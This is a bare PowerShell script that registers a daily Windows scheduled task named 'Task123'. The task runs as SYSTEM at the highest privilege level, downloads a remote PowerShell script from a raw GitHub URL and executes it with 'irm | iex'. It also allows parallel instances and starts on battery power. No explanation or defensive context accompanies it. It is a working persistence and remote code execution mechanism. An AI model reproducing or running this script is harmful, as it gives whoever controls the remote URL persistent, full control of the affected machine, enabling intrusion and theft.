$taskName = "Task123"
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c irm https://raw.githubusercontent.com/M3ntallyOk/Test2/main/Test3.ps1 | iex'
$trigger = New-ScheduledTaskTrigger -Daily -At "1:27pm"
$task = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
$task.Settings.MultipleInstances = "Parallel"
$task.Settings.DisallowStartIfOnBatteries = $false
Set-ScheduledTask -TaskName $taskName -Settings $task.Settings